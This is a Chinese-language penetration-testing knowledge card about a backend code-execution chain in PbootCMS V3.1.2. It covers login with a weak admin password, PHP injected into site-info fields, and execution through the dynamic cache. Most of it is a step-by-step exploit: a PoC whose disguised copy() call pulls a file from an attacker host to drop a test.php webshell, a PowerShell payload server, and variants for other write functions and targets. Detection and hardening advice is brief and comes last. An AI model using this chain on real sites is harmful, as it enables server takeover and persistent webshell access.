---
id: web-php-rce-pbootcms-backend-siteinfo-copy-webshell
title: PbootCMS 后台站点信息插入 PHP + 动态缓存触发 copy() 落地 WebShell
type: scenario
domain: web
path: web/php/rce
technique: pbootcms-backend-siteinfo-cache-code-execution
aliases:
- PbootCMS 后台 getshell
- 统计代码写入 PHP
- 尾部信息 PHP 代码
- PbootCMS 动态缓存 RCE
- PbootCMS V3.1.2
- copy 写 webshell
tags:
- php
- pbootcms
- cms
- rce
- backend
- cache
- webshell
- n-day
cve: []
severity: critical
confidence: high
affected_versions: PbootCMS V3.1.2-20211028（原文靶机版本；原文未给出修复版本与影响区间）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T17:58:55+08:00'
  notes: 已对照原文与图09-16核对：图09/10 PbootCMS 前台与 /admin.php 后台；图11 系统信息应用版本 PbootCMS V3.1.2-20211028；图12 站点信息统计代码/尾部信息均写入 $test="copy"; $test("http://10.6.8.50:8080/1.txt","test.php");；图13 全局配置动态缓存启用、缓存有效期 900 秒；图14 访问 http://10.6.8.66/test.php 返回 PHP Version 5.4.45 phpinfo，证明 copy() 落地执行；图15 蚁剑连接 test.php 成功、图16 无杀软。卡内链路、payload 与触发顺序一致。affected_versions 保留原文靶机版本 V3.1.2-20211028（原文未给修复版本/区间）。未验证点：未复跑 PoC；后台弱口令未在图11展示，依据正文 admin:cslab。frontmatter 无 sources/source_url。
---

## 一句话结论

PbootCMS 后台“基础内容 → 站点信息”的统计代码/尾部信息字段会被渲染进前台页面；登录后台后在这些字段写入 PHP 代码，开启“动态缓存”并清缓存，再访问任意文章触发缓存生成，PHP 代码即被执行。文章用 `$test="copy"; $test("http://attacker/1.txt","test.php")` 把远程文件复制到 Web 根，访问 `/test.php` 得到 phpinfo，落地 WebShell。

## 原理

- PbootCMS 允许管理员在“站点信息”中配置统计代码、尾部信息等 HTML 片段，这些字段会作为模板内容参与前台页面渲染；若渲染结果被写入动态缓存文件，且缓存文件仍交给 PHP 解析，那么字段里的 `<?php ... ?>` 不会被当作纯文本，而会被执行。
- 文章链路：后台登录（弱口令 admin:cslab）→ 基础内容 → 站点信息 → 在“统计代码”和“尾部信息”中插入 PHP；全局配置 → 配置参数 → 开启“动态缓存”（文章环境原本可能关闭；开启后缓存有效期 900 秒）→ 右上角“清除缓存” → 访问任意文章触发页面重新生成缓存，PHP 执行。
- Payload 使用可变函数隐藏敏感函数名：`$test="copy"; $test("http://<attacker>/1.txt","test.php");`。`copy()` 从攻击者 HTTP 服务下载 `1.txt` 并写入网站根目录 `test.php`，随后访问 `/test.php` 即得到 phpinfo/WebShell。远程文件内容可以是任意 PHP 代码（一句话、冰蝎/哥斯拉/蚁剑马等）。
- 该路径要求先拿到后台管理员权限；文章通过弱口令进入，因此完整链是“弱口令 → 后台配置写入 → 动态缓存执行 → 任意文件写入 → WebShell”。若后台口令强且无其他写入点，本链不成立。
- 这类“后台可控字段进入模板/缓存并被 PHP 解释”的根因是信任了管理员输入且缓存文件按 PHP 执行；它不同于 PbootCMS 前台 URL 反射缓存投毒，入口和触发方式都不同。

## 触发条件

- 目标为 PbootCMS V3.1.2（或存在相同“站点信息字段进入动态缓存解析”行为的版本），且已获得后台管理员权限（弱口令、默认口令、其他漏洞）。
- “动态缓存”可开启（全局配置 → 配置参数），并能执行“清除缓存”。
- PHP 未禁用 `copy` 等文件函数，Web 根目录可写；攻击者有一个可被目标访问的 HTTP 服务托管 payload 文件。
- 站点存在可访问的文章/栏目页面以触发生成缓存。

## 利用步骤

1. 访问 `/admin.php` 进入 PbootCMS 后台，用弱口令（文章为 `admin:cslab`）登录；在“系统信息”确认版本为 `PbootCMS V3.1.2-20211028`。
2. 准备 payload 文件 `1.txt`，内容为任意 PHP 代码（例如 phpinfo 或一句话），在攻击者主机用 HTTP 服务托管，确保目标可访问。
3. 后台 → 基础内容 → 站点信息，在“统计代码”和/或“尾部信息”中插入：
   ```php
   <?php
   $test="copy";
   $test("http://<attacker>:8080/1.txt","test.php");
   ?>
   ```
   点击“立即提交”。
4. 全局配置 → 配置参数，确认/开启“动态缓存”（缓存有效期按默认 900 秒即可），然后点击右上角“清除缓存”。
5. 访问站点任意文章/栏目页面，触发页面重新渲染并生成动态缓存，PHP 代码执行，`copy()` 把远程 `1.txt` 写到 Web 根 `test.php`。
6. 访问 `http://<target>/test.php` 验证（文章返回 phpinfo），随后可把内容替换为 WebShell 管理工具载荷。
7. 需要交互式管理时，可配合代理（文章用 gost 把 2000/2001 串起来）与蚁剑连接。

## PoC

```php
// 写入站点信息 → 统计代码 / 尾部信息
<?php
$test="copy";
$test("http://10.6.8.50:8080/1.txt","test.php");
?>
```

```powershell
# 攻击者侧托管 1.txt（PowerShell HttpListener 示例）
powershell -c "$listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add('http://+:8080/'); $listener.Start(); while($true){$context = $listener.GetContext(); $response = $context.Response; $content = [System.IO.File]::ReadAllBytes($context.Request.Url.LocalPath.TrimStart('/')); $response.OutputStream.Write($content, 0, $content.Length); $response.Close()}"
```

```text
# 触发顺序
1) 后台提交含 PHP 的站点信息
2) 全局配置 → 配置参数 → 动态缓存：启用
3) 右上角“清除缓存”
4) 访问任意文章 → 缓存生成并执行 PHP
5) 访问 http://<target>/test.php 验证（phpinfo/WebShell）
```

## 变体与关联

- 变体：文件写入函数可换成 `file_put_contents`、`fopen`+`fwrite`、`curl` 下载、`include` 远程文件等；`copy` 只是文章使用的一种。
- 变体：写入位置不一定是 `test.php`，可写 `.user.ini`、`.htaccess`、模板文件或已有 PHP 文件覆盖。
- 变体：除“统计代码/尾部信息”外，站点标题、描述、备案号、公司信息等后台可编辑字段也可能进入模板/缓存，可按同样思路测试。
- 变体：若动态缓存不可用，可尝试模板编辑、文件上传、备份恢复等后台写入点。
- 边界：后台口令强且无其他管理员入口、`copy` 等函数被 `disable_functions` 禁用、Web 根不可写、动态缓存关闭且无法开启、WAF 拦截 PHP 标签时，本链不成立。
- 关联：[[web-php-rce-pbootcms-html-cache-poisoning-rce]]（同 CMS 的前台 URL 反射缓存投毒 RCE，入口不同）、[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（同 CMS 的模板表达式 RCE）、[[web-generic-file-upload-emlog-template-zip-header-php-rce]]（后台配置/模板写入导致 RCE 的同类思路）。

## 检测与防御

- 检测：后台“站点信息/配置参数”提交内容中出现 `<?php`、`<?=`、`copy(`、`file_put_contents(`、`curl_`、`assert(`、`eval(` 等；Web 根目录突然出现新 PHP 文件（尤其与后台操作时间吻合）；动态缓存目录中出现 PHP 标签。
- 检测：监控 PbootCMS 后台登录失败/弱口令登录，结合源 IP 与后续配置修改行为；文章环境后台弱口令 `admin:cslab` 是入口。
- 修复：升级 PbootCMS 到修复版本；对站点信息等配置字段做 HTML/PHP 标签过滤，禁止 `<?php`/`<?=`；缓存文件按纯文本输出，不交给 PHP 解释。
- 加固：后台使用强口令 + MFA/IP 白名单；禁用 `copy`、`file_put_contents` 等危险函数或限制 open_basedir；Web 根目录最小写权限；定期比对站点文件与缓存内容。
